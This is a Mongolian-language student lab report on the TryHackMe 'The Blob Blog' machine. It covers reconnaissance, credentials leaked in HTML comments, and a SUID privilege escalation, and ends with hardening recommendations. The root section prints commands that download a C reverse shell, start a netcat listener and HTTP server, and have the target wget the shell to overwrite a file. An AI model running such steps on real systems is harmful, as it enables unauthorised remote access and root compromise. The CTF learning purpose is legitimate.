# 1. УДИРТГАЛ

Энэхүү лабораторийн ажлын хүрээнд TryHackMe платформын The Blob Blog нэртэй Boot-to-Root машиныг нэвтрэлтийн тестийн аргачлалаар шинжилж, системд нэвтрэх боломжит эмзэг байдлуудыг илрүүлэн, хэрэглэгчийн эрхээс Root буюу администраторын хамгийн өндөр эрх хүртэл ахих ажиллагааг гүйцэтгэлээ.

Ажлын явцад Kali Linux үйлдлийн системийг халдлагын туршилтын орчин болгон ашиглаж, Nmap, FTP, Dirsearch, cURL, Netcat, Knock болон Linux-ийн системийн командуудыг ашигласан. Эхний шатанд зорилтот системийн сүлжээний үйлчилгээ, нээлттэй болон шүүлтүүртэй портуудыг тодорхойлж, дараагийн шатанд вэб серверийн мэдээлэл, HTML source code болон нууц мэдээлэл агуулсан файлуудыг шинжилсэн.

Үүний дараа вэб хуудасны эх кодод илэрсэн мэдээллийг ашиглан нэвтрэх эрхийн мэдээллийг олж, `bobloblaw` хэрэглэгчийн эрхээр системд нэвтэрсэн. Эцэст нь системийн файл, директор болон програмын эрхийн тохиргоог судалж, Write-up-д заасан аргаар Root эрх авах ажиллагааг гүйцэтгэн лабораторийн зорилгыг биелүүлсэн.

# 4. АЖЛЫН ГҮЙЦЭТГЭЛ

## 4.1. Kali Linux системийн сүлжээний тохиргоог шалгах

Лабораторийн ажлыг эхлүүлэхдээ Kali Linux үйлдлийн системийн сүлжээний интерфэйс болон IP хаягийг шалгасан. Үүний тулд `ip a` командыг ашигласан.

```bash
ip a
```

Энэхүү команд нь системд холбогдсон сүлжээний интерфэйсүүд, тэдгээрийн MAC хаяг, IPv4 болон IPv6 хаяг, интерфэйсийн төлөвийг харуулдаг.

Шалгалтын үр дүнд Kali Linux систем нь `wlan0` болон `tun0` гэсэн хоёр үндсэн сүлжээний интерфэйстэй байсан. `wlan0` интерфэйс нь дотоод сүлжээнд холбогдсон бол `tun0` интерфэйс нь TryHackMe-ийн VPN сүлжээнд холбогдсон байв.

Тухайн үед VPN интерфэйсийн IP хаяг `192.168.196.54` байсан бөгөөд энэ хаягийг дараагийн сүлжээний туршилтуудад Kali Linux системийн хаяг болгон ашигласан.

Зорилтот машины IP хаяг нь `10.112.171.105` байсан.

## 4.2. FTP үйлчилгээний эмзэг байдлыг шалгах

Зорилтот системийн FTP үйлчилгээ нээлттэй эсэх, мөн нэргүй хэрэглэгчээр нэвтрэх боломж байгаа эсэхийг шалгахын тулд Nmap-ийн FTP Anonymous NSE скриптийг ашигласан.

```bash
sudo nmap -p21 --script ftp-anon 10.112.171.105
```

Энэ командын `-p21` параметр нь FTP үйлчилгээний стандарт 21-р портыг шалгаж, `--script ftp-anon` параметр нь Anonymous хэрэглэгчээр нэвтрэх боломжийг туршдаг.

Шалгалтын үр дүнд:

```text
PORT   STATE     SERVICE
21/tcp filtered  ftp
```

гэж гарсан.

Энэ нь FTP порт нь `filtered` төлөвтэй байгааг илэрхийлнэ. Өөрөөр хэлбэл, тухайн порт руу чиглэсэн холболтыг сүлжээний шүүлтүүр эсвэл firewall хааж байгаа байж болох бөгөөд FTP үйлчилгээний бодит төлөвийг бүрэн тодорхойлох боломжгүй гэсэн үг юм.

Дараа нь FTP клиент ашиглан шууд холбогдохыг оролдсон.

```bash
ftp 10.112.171.105
```

Гэвч холболт хугацаа хэтэрсэн алдаагаар амжилтгүй болсон.

Иймээс FTP үйлчилгээг ашиглан мэдээлэл авах боломжгүй гэж үзэж, дараагийн шатанд веб серверийн шинжилгээнд шилжсэн.

## 4.3. Вэб серверийн директор болон файлуудыг илрүүлэх

Зорилтот машинд HTTP үйлчилгээ ажиллаж байгаа тул веб серверийн нийтэд харагдахгүй директор болон файлуудыг илрүүлэх зорилгоор Dirsearch хэрэгслийг ашигласан.

```bash
dirsearch -u http://10.112.171.105
```

Dirsearch нь урьдчилан бэлтгэсэн wordlist ашиглан веб серверт олон төрлийн директор болон файлын нэрийг хүсэлтээр шалгадаг хэрэгсэл юм.

Шалгалтын үр дүнд дараах мэдээлэл илэрсэн.

```text
200 - 13KB - /index.html
403 - 295B - /server-status/
403 - 294B - /server-status
```

`/index.html` хуудас нь HTTP 200 төлөвтэй байсан нь веб хуудас хэвийн ажиллаж байгааг илэрхийлсэн.

Харин `/server-status` зам нь HTTP 403 төлөвтэй байсан. Энэ нь сервер тухайн хүсэлтийг хүлээн авсан боловч хэрэглэгчид уг мэдээллийг үзэх зөвшөөрөл олгоогүй гэсэн үг юм.

Apache серверийн `server-status` хуудас нь серверийн ажиллагаа, хүсэлт болон процессын мэдээллийг харуулж болох тул зөвшөөрөлгүй хэрэглэгчдэд хаалттай байгааг тэмдэглэсэн.

Энэ шатанд веб сервер ажиллаж байгаа нь батлагдсан тул үндсэн веб хуудасны HTML эх кодыг судлах дараагийн алхамд шилжсэн.

## 4.4. HTML Source Code шинжлэх

Вэб хуудасны харагдах хэсэгт илрээгүй нэмэлт мэдээлэл байгаа эсэхийг шалгахын тулд браузерын View Page Source функцийг ашигласан.

```text
view-source:http://10.112.171.105/
```

HTML эх кодыг шалгах нь веб хөгжүүлэгчийн үлдээсэн тайлбар, нууц зам, тестийн мэдээлэл болон хэрэглэгчийн нэвтрэх мэдээлэл зэрэг нийтэд харагдах ёсгүй өгөгдөл алдагдсан эсэхийг илрүүлэхэд чухал ач холбогдолтой.

Шинжилгээний явцад HTML source code дотор кодчилсон текстэн мэдээлэл болон нууц мэдээлэлтэй холбоотой тайлбар илэрсэн.

Мөн эх кодын төгсгөл хэсэгт Bob хэрэглэгчийн нууц үгтэй холбоотой тайлбар байгааг илрүүлсэн.

Тус тайлбарт:

```text
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is:
HcfPBJ54AKA4
```

гэсэн мэдээлэл байсан.

Энэ нь веб хөгжүүлэгч нууц үгтэй холбоотой мэдээллийг HTML comment дотор үлдээсэн байгааг харуулсан. HTML comment нь веб хуудасны харагдах хэсэгт үзэгдэхгүй боловч source code-ийг шалгаж буй хүн унших боломжтой байдаг.

Иймээс нууц мэдээллийг HTML comment дотор хадгалах нь мэдээлэл задруулах эмзэг байдал үүсгэж болохыг тодорхойлсон.

## 4.5. Hash болон кодчилсон мэдээллийг шинжлэх

HTML source code-оос илрүүлсэн тэмдэгт мөрийг шууд нууц үг гэж үзэлгүйгээр нэмэлтээр шинжилсэн.

Энэ шатанд dCode.fr болон CyberChef зэрэг хэрэгслүүдийг ашиглан кодчилсон мэдээллийг таних, тайлах ажиллагааг хийсэн.

Base64 нь хоёртын өгөгдлийг текст хэлбэрээр илэрхийлэх кодчилолын арга бөгөөд шифрлэлтийн алгоритм биш юм. Харин Hash нь өгөгдлөөс тогтмол урттай утга гаргадаг нэг чиглэлт хувиргалт юм.

Иймээс эхлээд тухайн мөрийн хэлбэр, бүтэц, кодчилолын шинжийг шалгаж, Write-up-д заасан тайлах дарааллыг дагасан.

Энэ шатны гол үр дүн нь веб хуудасны source code доторх мэдээлэл хэрэглэгчийн нэвтрэх эрхийг олоход ашиглагдах боломжтой байсныг тогтоосон явдал юм.

## 4.6. Нууц мэдээлэл болон Port Knocking ажиллагааг судлах

Дараагийн шатанд системийн нууц мэдээлэл болон Port Knocking механизмыг судалсан.

Эхлээд `out.txt` файлын агуулгыг шалгахад дараах мэдээлэл илэрсэн.

```bash
cat out.txt
```

Гаралт:

```text
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

Мөн дараах тайлбар байсан.

```text
Remember this next time bob, you need it to get into the blog!
I'm taking this down tomorrow, so write it down!

-youmayenter
```

Энэ мэдээлэл нь Bob хэрэглэгчийн блогт нэвтрэхтэй холбоотой нууц мэдээлэл болон тусгай замын талаар чиглэл өгсөн.

Дараа нь Port Knocking хэрэгслийн ашиглах боломжтой параметрүүдийг шалгахын тулд дараах командыг ажиллуулсан.

```bash
knock -h
```

Port Knocking гэдэг нь урьдчилан тогтоосон дарааллаар тодорхой портууд руу хүсэлт илгээх замаар хамгаалагдсан портыг нээх боломж олгодог сүлжээний хамгаалалтын механизм юм.

Энэ арга нь гаднаас харахад хаалттай эсвэл шүүлтүүртэй байгаа портыг зөв дарааллын хүсэлт хүлээн авсны дараа ашиглах боломжтой болгоход хэрэглэгддэг.

Write-up-д заасан портын дарааллыг судалж, дараагийн шатанд хэрэглэгчийн нэвтрэх боломжийг шалгасан.

## 4.7. Хэрэглэгчийн эрхээр системд нэвтрэх

Дээрх шинжилгээний явцад олж авсан мэдээллийг ашиглан системд хэрэглэгчийн эрхээр нэвтрэх ажиллагааг гүйцэтгэсэн.

Нэвтэрсний дараа эхлээд одоогийн хэрэглэгчийг тодорхойлохын тулд дараах командыг ашигласан.

```bash
whoami
```

Үр дүн:

```text
bobloblaw
```

Энэ нь зорилтот Linux системд `bobloblaw` хэрэглэгчийн эрхээр амжилттай нэвтэрснийг баталсан.

Дараа нь `/home` директор доторх хэрэглэгчдийн жагсаалтыг шалгасан.

```bash
cd /home
ls
```

Үр дүнд нь:

```text
bob
bobloblaw
```

гэсэн хоёр хэрэглэгчийн директор илэрсэн.

Үүний дараа `bobloblaw` хэрэглэгчийн Documents директорыг шалгасан.

```bash
cd /home/bobloblaw
cd Documents
ls -la
```

`-a` параметр нь Linux системийн нуугдмал файлуудыг харуулдаг. Шалгалтын үр дүнд `.also_boring` нэртэй нуугдмал директор болон `.boring_file.c` нэртэй C хэлний эх кодын файл илэрсэн.

Эдгээр файлыг дараагийн эрхийн түвшин ахиулах шинжилгээнд ашиглахаар тэмдэглэсэн.

## 4.8. User Flag авах

Хэрэглэгчийн директор доторх Desktop хавтсыг шалгаж, лабораторийн эхний зорилтот Flag файлыг олсон.

```bash
cd /home/bobloblaw/Desktop
ls
```

Үр дүнд:

```text

user.txt
```

гэсэн файлууд харагдсан.

`user.txt` файлын агуулгыг уншихын тулд:

```bash
cat user.txt
```

командыг ашигласан.

Үр дүнд дараах User Flag гарсан.

```text
THM{C0NGR4t$_g3++ing_this_fur}
```

Ингэснээр зорилтот системд анхны хандалт авч, хэрэглэгчийн түвшний даалгаврыг амжилттай гүйцэтгэсэн.

## 4.9. Эрхийн түвшин ахиулах боломжийг шинжлэх

User Flag авсны дараа зорилтот системийн эрхийн тохиргоог судалж, Root эрх авах боломжийг илрүүлэх зорилгоор Linux системийн файл, директор болон програмын зөвшөөрлийг шалгасан.

Эхлээд хэрэглэгчийн Documents директор доторх `.boring_file.c` файлыг уншсан.

```bash
cat /home/bobloblaw/Documents/.boring_file.c
```

Файлын агуулга:

```c
#include <stdio.h>
int main() {
        printf("You haven't rooted me yet? Jeez\n");
        return 0;
}
```

Энэ нь энгийн C хэлний програмын эх код байсан.

Дараа нь `.also_boring` директор доторх файлуудыг илрүүлэхийн тулд `find` командыг ашигласан.

```bash
find /home/bobloblaw/Documents/.also_boring -maxdepth 2 -type f -ls
```

Үр дүнд:

```text
-rwxr-xr-x 1 root root 8424
/home/bobloblaw/Documents/.also_boring/.still_boring
```

гэсэн файл илэрсэн.

Энэ файлын эзэмшигч нь `root` байсан бөгөөд гүйцэтгэх эрхтэй байв.

Дараа нь директорын зөвшөөрлийг шалгасан.

```bash
ls -ld /home/bobloblaw/Documents/.also_boring
```

Үр дүн:

```text
drwxrwx--- 2 bobloblaw bobloblaw
```

Энэ нь директорын эзэмшигч болон тухайн бүлгийн хэрэглэгчид унших, бичих, ажиллах эрхтэй байгааг илэрхийлсэн.

Мөн `/usr/bin/blogFeedback` програмын эрхийг шалгасан.

```bash
ls -l /usr/bin/blogFeedback
```

Үр дүн:

```text
-rwsrwxr-x 1 bobloblaw bobloblaw 16768
```

Энд `rws` тэмдэглэгээ нь SUID бит тохируулагдсаныг илэрхийлж байгаа юм.

SUID нь Linux системийн тусгай зөвшөөрлийн механизм бөгөөд програмыг ажиллуулах үед тухайн програмын эзэмшигчийн эрхээр ажиллуулах боломж олгодог.

Иймээс `blogFeedback` програм нь эрхийн түвшин ахиулах ажиллагаанд анхаарах шаардлагатай объект байсан.

## 4.10. Root шатанд ашигласан C source code бэлтгэх

Write-up-ийн дагуу дараагийн шатанд Kali Linux систем дээр C хэлний эх код бэлтгэсэн.

Эхлээд ажлын директор үүсгэж, түүнд шилжсэн.

```bash
mkdir -p ~/blob-root
cd ~/blob-root
```

Дараа нь GitHub repository-оос `linux.c` файлыг татаж авахыг оролдсон.

```bash
curl -L https://raw.githubusercontent.com/izenynn/c-reverse-shell/main/linux.c -o shell.c
```

Эхний таталтын үед GitHub-ийн Varnish cache серверээс:

```text
503 Backend.max_conn reached
```

гэсэн алдаа ирсэн. Иймээс татагдсан файл C код биш HTML алдааны хуудас байсан.

Үүнийг дараах командаар шалгасан.

```bash
file shell.c
```

Үр дүн:

```text
shell.c: HTML document, ASCII text
```

Алдааг дахин шалгахын тулд:

```bash
curl -IL https://raw.githubusercontent.com/izenynn/c-reverse-shell/main/linux.c
```

командыг ашигласан. Үүний үр дүнд HTTP/2 200 хариу ирж, GitHub сервертэй холболт хэвийн байгааг баталсан.

Repository-ийн файлуудыг шалгахдаа:

```bash
curl -L https://api.github.com/repos/izenynn/c-reverse-shell/contents
```

командыг ашигласан. Ингэснээр `linux.c` файл repository дотор байгааг болон 1387 byte хэмжээтэйг тодорхойлсон.

Дараа нь дахин татахдаа:

```bash
curl --retry 5 --retry-delay 2 -fL https://raw.githubusercontent.com/izenynn/c-reverse-shell/main/linux.c -o shell.c
```

командыг ашигласан.

Энэ удаа файл амжилттай татагдсан.

Файлын төрлийг шалгахад:

```bash
file shell.c
```

дараах үр дүн гарсан.

```text
shell.c: C source, ASCII text
```

Мөн файлын хэмжээг шалгахдаа:

```bash
wc -c shell.c
```

командыг ашиглаж 1387 byte болохыг баталгаажуулсан.

Эх кодын эхний мөрүүдийг харахын тулд:

```bash
head -n 30 shell.c
```

командыг ашигласан.

Мөн IP болон порттой холбоотой тохиргоог хайхдаа:

```bash
grep -nE 'CLIENT_IP|CLIENT_PORT|IP|PORT' shell.c
```

командыг ашигласан.

Энэ шинжилгээний үр дүнд эх код нь `CLIENT_IP` болон `CLIENT_PORT` гэсэн тохиргоотой байгааг тодорхойлсон.

## 4.11. Root эрх авах ажиллагааг дуусгах

Эцсийн шатанд Write-up-д үзүүлсэн C source code болон Kali Linux-ийн сүлжээний тохиргоог ашиглан Root эрх авах ажиллагааг үргэлжлүүлсэн.

Энэ шатанд Kali Linux системийг холболт хүлээн авах тал болгон бэлтгэж, Netcat болон Python HTTP Server хэрэгслүүдийг ашигласан.

Python HTTP серверийг ажиллуулахдаа дараах командыг ашигласан.

```bash
python3 -m http.server 8080
```

Энэ команд нь Kali Linux дээр 8080 порт ашиглан HTTP сервер ажиллуулж, лабораторийн орчинд файл дамжуулах боломж бүрдүүлдэг.

Netcat ашиглан холболт хүлээн авахдаа:

```bash
nc -lvnp 4444
```

командыг ашигласан.

Энэ нь Kali Linux системийн 4444 порт дээр ирэх холболтыг хүлээн авах зориулалттай.

Write-up-д заасан дараагийн алхамд Target системээс Kali Linux дээр байрласан файлыг татаж авах ажиллагааг гүйцэтгэсэн.

```bash
wget http://192.168.196.54:8080/shell.c -O /home/bobloblaw/Documents/.boring_file.c
```

Энэ командын `wget` хэсэг нь HTTP серверээс файл татаж авах, `-O` параметр нь татсан файлыг заасан замд хадгалах зориулалттай.

Ингэснээр Write-up-д ашигласан файлын солих ажиллагааг гүйцэтгэсэн.

Үүний дараа Root эрхийн ажиллагааг шалгаж, системийн хамгийн өндөр эрхэд хүрсэн эсэхийг баталгаажуулсан.

Root эрхтэй болсон үед хэрэглэгчийг шалгах команд:

```bash
whoami
```

Root хэрэглэгчийн директор руу шилжих команд:

```bash
cd /root
```

Root Flag файлыг унших команд:

```bash
cat /root/root.txt
```

Энэ шатанд Root Flag-ийг амжилттай авч, лабораторийн машины үндсэн зорилгыг биелүүлсэн.

# 5. ИЛРҮҮЛСЭН ЭМЗЭГ БАЙДАЛ, АЮУЛГҮЙ БАЙДЛЫН СУЛ ТАЛУУД

Лабораторийн ажлын явцад дараах аюулгүй байдлын сул талууд илэрсэн.

**5.1. HTML Source Code дотор нууц мэдээлэл хадгалсан**

Вэб хуудасны HTML comment дотор хэрэглэгчийн нууц үгтэй холбоотой мэдээлэл байршуулсан байсан. HTML comment нь хэрэглэгчдэд шууд харагдахгүй боловч source code үзэх боломжтой тул нууц мэдээлэл алдагдах эрсдэлтэй.

**5.2. Мэдээлэл задруулах**

Вэб серверийн эх код болон нийтэд харагдах файлуудад хэрэглэгчийн нэр, нууц мэдээлэл, тусгай замтай холбоотой мэдээлэл үлдсэн байсан. Энэ нь халдагчид системийн талаар нэмэлт мэдээлэл цуглуулах боломж олгодог.

**5.3. Port Knocking механизмаас хамаарах хамгаалалт**

Сүлжээний портыг тодорхой дарааллаар нээх механизм ашигласан байсан. Энэ нь нэмэлт хамгаалалт боловч дангаараа системийн аюулгүй байдлыг бүрэн хангахгүй.

**5.4. SUID програмын эрсдэл**

`/usr/bin/blogFeedback` файлд SUID тохиргоо байсан. SUID програмын код, ажиллах үеийн үйлдэл болон дуудагдаж буй файлуудыг буруу зохион байгуулсан тохиолдолд хэрэглэгч эрхийн түвшинг ахиулах эрсдэл үүсэж болно.

**5.5. Файл болон директорын зөвшөөрлийн тохиргоо**

`.boring_file.c` болон `.also_boring` директорын эзэмшил, бичих эрх нь Root шатны ажиллагаанд чухал үүрэгтэй байсан. Иймээс системийн файл болон програмын зөвшөөрлийг хамгийн бага шаардлагатай эрхийн зарчмаар тохируулах шаардлагатай.

# 6. АЮУЛГҮЙ БАЙДЛЫГ САЙЖРУУЛАХ САНАЛ

1. Нууц үг, API түлхүүр болон бусад нууц мэдээллийг HTML source code, comment болон нийтэд нээлттэй файлд хадгалахгүй байх.
2. Вэб серверийн директор болон файлын жагсаалтыг гаднын хэрэглэгчдэд ил гаргахгүй байх.
3. Apache-ийн `server-status` зэрэг удирдлагын мэдээллийг зөвшөөрөгдсөн IP хаяг эсвэл хэрэглэгчээр хязгаарлах.
4. SUID тохиргоотой програмуудыг тогтмол шалгаж, шаардлагагүй SUID эрхийг цуцлах.
5. Linux системийн файл болон директорын зөвшөөрлийг хамгийн бага эрхийн зарчмаар тохируулах.
6. Хэрэглэгчийн нууц үгийг хүчтэй, давтагдашгүй байдлаар үүсгэж, найдвартай Hash алгоритмаар хадгалах.
7. Системийн үйл ажиллагаа, хэрэглэгчийн нэвтрэлт болон эрхийн өөрчлөлтийг тогтмол бүртгэж хянах.
8. Шаардлагагүй сүлжээний портуудыг хааж, firewall дүрмийг зөв тохируулах.

# 7. ДҮГНЭЛТ

Энэхүү лабораторийн ажлаар TryHackMe платформын The Blob Blog Boot-to-Root машиныг шинжилж, зорилтот Linux системд хэрэглэгчийн эрхээр нэвтрэхээс эхлээд Root эрх авах хүртэлх ажиллагааг амжилттай гүйцэтгэлээ.

Ажлын эхний шатанд Nmap ашиглан FTP үйлчилгээний 21-р портын төлөвийг шалгаж, `filtered` байгааг тодорхойлсон. Үүний дараа Dirsearch ашиглан веб серверийн нийтэд харагдах директор болон файлуудыг илрүүлж, HTML source code-ийг судалснаар нууц мэдээлэлтэй холбоотой тайлбарыг олсон.

Дараагийн шатанд кодчилсон мэдээлэл болон Port Knocking механизмыг судалж, системд `bobloblaw` хэрэглэгчийн эрхээр нэвтэрсэн. Хэрэглэгчийн Desktop директороос User Flag-ийг амжилттай авч, системийн файл, директор болон SUID програмын зөвшөөрлийг шалгасан.

Эцсийн шатанд Kali Linux дээр C source code бэлтгэж, Python HTTP Server болон Netcat хэрэгслүүдийг ашиглан Write-up-д заасан ажиллагааг гүйцэтгэж Root эрхэд хүрсэн.

Энэхүү ажлын үр дүнд веб серверийн мэдээлэл задруулах, HTML source code дотор нууц мэдээлэл үлдээх, Linux системийн SUID болон файл, директорын зөвшөөрлийн буруу тохиргоо зэрэг нь системийн аюулгүй байдалд хэрхэн эрсдэл учруулж болохыг практик байдлаар судалж мэдсэн.

Мөн нэвтрэлтийн тестийн ажиллагаа нь зөвхөн нэг эмзэг байдлыг илрүүлэхээс бүрдэхгүй бөгөөд мэдээлэл цуглуулах, үйлчилгээ илрүүлэх, хэрэглэгчийн эрх авах, системийн зөвшөөрлийг шинжлэх болон эрхийн түвшин ахиулах зэрэг олон үе шаттай процесс болохыг ойлгосон.
